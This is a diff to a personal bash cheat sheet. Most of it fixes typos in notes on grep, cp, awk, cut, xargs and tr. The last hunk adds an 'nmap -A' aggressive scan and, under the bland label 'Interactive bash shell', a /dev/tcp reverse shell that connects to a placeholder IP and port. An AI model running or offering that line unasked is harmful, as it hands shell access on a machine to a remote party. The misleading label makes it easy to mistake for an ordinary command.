@@ -32,12 +32,12 @@ sed -i '$LINE_NUMi \n' foo.txt
 ```bash
 ls | while read f; do while read -r line; do echo $line; done < $f ; done
 ```
-* Search though a directory recursively with grep, kind of like reading line by line, -i ignore case, -l output filename that match, -L filename that doesnt match
+* Search though a directory recursively with grep, kind of like reading line by line, -i ignore case, -l output filename that match, -L filename that doesn't match
 ```bash
 grep -r --include '*.py' STRING .
 ```
 
-* Copy an entire directory to another dicretory
+* Copy an entire directory to another directory
 ```bash
 cp -R source dest
 ```
@@ -70,7 +70,7 @@ jobs
 ps
 ```
 
-* Retrive the first word from stdout
+* Retrieve the first word from stdout
 ```bash
 echo "hello world" | awk '{print $1;}'
 ||
@@ -178,7 +178,7 @@ ESC + Backspace
 ```bash
 ESC + d
 ```
-* Cut (returns Hello) -d = deliminiter, -f = field (fields are numbered from 1)
+* Cut (returns Hello) -d = deliminator, -f = field (fields are numbered from 1)
 ```bash
 echo "Hello World" | cut -d ' ' -f 1
 ```
@@ -188,7 +188,7 @@ echo "Hello World" | cut -d ' ' -f 1
 grep -avf "FILE.txt"
 ```
 
-* Xargs usage, useful pipes, but require the flag -print0, -I: replaces occurance of replace-str in the initial arguments with names read from std in
+* Xargs usage, useful pipes, but require the flag -print0, -I: replaces occurrence of replace-str in the initial arguments with names read from std in
 ```bash
 find . -type f -name "*.mp3" -print0 | xargs -0 -I file cp file dir/
 ||
@@ -201,14 +201,14 @@ ls | grep -avf "BLACKLIST" | xargs -I file COMMANDS file
 7z x ZIP.zip -oEXTRACTED
 ```
 
-* tr. It translates and/or deletes chars from stdin input, and writes to stdout. -d: deletes all occurance, -s: make repeated sequential characters only appear once
+* tr. It translates and/or deletes chars from stdin input, and writes to stdout. -d: deletes all occurrence, -s: make repeated sequential characters only appear once
 ```bash
 tr [a-z] [A-Z] < lowercase.txt > uppercase.txt
 cat file.txt | tr -d ' '
 cat file.txt | tr -s '.'
 ```
 
-* grip. Using grip to build markdown files locally. -b: opens up a broswer tab.
+* grip. Using grip to build markdown files locally. -b: opens up a browser tab.
 ```bash
 grip -b FILE.md
 ```
@@ -237,4 +237,19 @@ ls DIR > dirlist
 ">&" Redirects output of one file to another, e.g. "2>&1" redirects error to output (pre bash 4.0)
 "&>>" does the above in post Bash 4.0 and apending it to a file
 "&>" does the above but overwrites the target file
+``` 
+
+* nmap -A: Aggressive mode
+```bash
+nmap -A IP
+```
+
+* Check architecture
+```bash
+dpkg --print-architecture
+```
+
+* Interactive bash shell
+```bash
+/bin/bash -i > /dev/tcp/IP/PORT 0<&1 2>&1
 ```
